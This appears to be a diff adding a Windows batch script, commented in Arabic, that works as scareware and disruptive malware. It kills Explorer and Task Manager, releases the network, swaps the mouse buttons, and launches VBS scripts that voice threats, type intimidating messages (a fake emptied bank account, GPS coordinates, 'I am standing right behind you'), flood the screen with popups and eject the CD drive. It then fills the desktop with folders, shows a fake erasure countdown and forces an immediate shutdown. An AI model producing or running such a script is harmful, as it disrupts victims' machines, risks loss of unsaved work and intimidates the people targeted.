@@ -1,0 +1,112 @@
+@echo off
+:: [SECTION 1: THE CORE INITIALIZATION]
+:: تهيئة النواة، إخفاء العمليات، ورفع الأولوية
+title MiTRgnAwiNAaH_OMNIPOTENT_v50.0
+chcp 65001 >nul
+color 0c
+mode con: cols=100 lines=30
+
+:: عزل المستخدم عن بيئة الويندوز فوراً
+powershell -Command "Stop-Process -Name explorer -Force; Stop-Process -Name taskmgr -Force" >nul 2>&1
+ipconfig /release >nul 2>&1
+RUNDLL32.EXE USER32.DLL,SwapMouseButton
+cls
+
+:: [SECTION 2: DYNAMIC RESOURCE GENERATION]
+:: توليد "محرك الجحيم" (Hell Engine) كملفات VBS مستقلة للإدارة المتوازية
+set "V_ENG=%temp%\v_eng.vbs"
+set "G_ENG=%temp%\g_eng.vbs"
+set "H_ENG=%temp%\h_eng.vbs"
+set "O_ENG=%temp%\o_eng.vbs"
+
+:: 1. محرك الصوت والضحك ونشيد المدمر (العملية المتكررة)
+(
+echo Dim S: Set S = CreateObject("SAPI.SpVoice"): S.Rate = -5: S.Volume = 100
+echo Sub Laugh(): S.Rate = 2: S.Speak "ha ha ha ha": S.Rate = -5: S.Speak "haaaaa": End Sub
+echo Sub Destroyer(): S.Rate = -6: S.Speak "I am the destroyer of worlds": Laugh(): End Sub
+echo ' البداية
+echo Destroyer()
+echo S.Speak "MiTRgnAwiNAaH has claimed your soul. Hormuz is closed."
+echo ' حلقة النطق المستمر
+echo For j = 1 To 10
+echo    S.Speak "Seventy curses are crawling inside your CPU."
+echo    S.Speak "Har kas az falask e aub benu-shad, tange-ye Hormuz ra barayesh baz mi-konim."
+echo    If j Mod 2 = 0 Then Destroyer()
+echo Next
+) > "%V_ENG%"
+
+:: 2. محرك الكتابة الشبحية (Ghost Scribe)
+(
+echo Set W = CreateObject("WScript.Shell")
+echo W.Run "notepad.exe": WScript.Sleep 2000
+echo W.SendKeys "MITRGNAWINA_ULTIMATE_OBLIVION:{ENTER}"
+echo W.SendKeys "BANK_ACCOUNT: [4859-XXXX-666] - EMPTY{ENTER}"
+echo W.SendKeys "GPS_LOCK: 25.0772 N, 55.1306 E {ENTER}"
+echo W.SendKeys "I AM STANDING RIGHT BEHIND YOU.{ENTER}"
+) > "%G_ENG%"
+
+:: 3. محرك حصار النوافذ (The Popup Siege)
+(
+echo Set W = CreateObject("WScript.Shell")
+echo For i = 1 To 500
+echo    W.Popup "أنا مدمر العوالم.. أنا أراك", 1, "MiTRgnAwiNAaH", 16+4096
+echo    W.Popup "هر کس از فلاسك آب بنوشد..", 1, "HORMUZ_ERROR", 48+4096
+echo Next
+) > "%H_ENG%"
+
+:: 4. محرك الاستحواذ المادي (CD-ROM)
+(
+echo Set O = CreateObject("WMPlayer.OCX.7")
+echo For i = 1 To 5: O.cdromCollection.Item(0).Eject: Next
+) > "%O_ENG%"
+
+:: [SECTION 3: MULTI-THREADED EXECUTION]
+:: إطلاق جميع المحركات في وقت واحد كعمليات خلفية مستقلة
+start /b wscript "%V_ENG%"
+start /b wscript "%G_ENG%"
+start /b wscript "%H_ENG%"
+start /b wscript "%O_ENG%"
+
+:: [SECTION 4: THE MAIN VISUAL LOOP & MORSE]
+:: إدارة الواجهة الرئيسية، طاعون المجلدات، وسيمفونية مورس
+echo [PROCESS]: INITIATING DIRECTORY INFECTION...
+cd %userprofile%\Desktop
+for /l %%x in (1, 1, 70) do (
+   mkdir "MiTRgnAwiNAaH_VOID_%%x" >nul 2>&1
+)
+
+echo [PROCESS]: BROADCASTING 70 MORSE CURSES...
+for /l %%i in (40,-1,1) do (
+   cls
+   color 0c
+   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+   echo !   [MiTRgnAwiNAaH]: TOTAL_SYSTEM_ERASURE_IN: %%i SECONDS                                   !
+   echo !   [MOD]: ASYNCHRONOUS_DESTRUCTION_MODE_ACTIVE                                             !
+   echo !   [LOG]: %random%%random%%random%%random%%random%                                         !
+   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+   :: ترددات مورس احترافية تزداد حدة
+   powershell -Command "[console]::beep( (40-%%i)*35 + 450, 65)"
+   color 4f
+)
+
+:: [SECTION 5: THE FINAL TERMINATION]
+:: الوداع الأخير، شاشة الموت، والإغلاق الصادم
+cls
+color 17
+echo.
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo !  FATAL_ERROR: SYSTEM_INTEGRITY_DESTROYED_BY_MiTRgnAwiNAaH.                               !
+echo !  ALL REALITIES HAVE BEEN ARCHIVED.                                                       !
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo *** STOP: 0x00000666 (FINAL_JUDGMENT)
+timeout /t 7 >nul
+
+:: الضربة القاضية
+RUNDLL32.EXE USER32.DLL,SwapMouseButton
+shutdown -s -f -t 00 -c "MiTRgnAwiNAaH: أنا مدمر العوالم. نراك خلف الترمس في مضيق هرمز."
+
+:: [SECTION 6: CLEANUP]
+del "%V_ENG%" /f /q
+del "%G_ENG%" /f /q
+del "%H_ENG%" /f /q
+del "%O_ENG%" /f /q
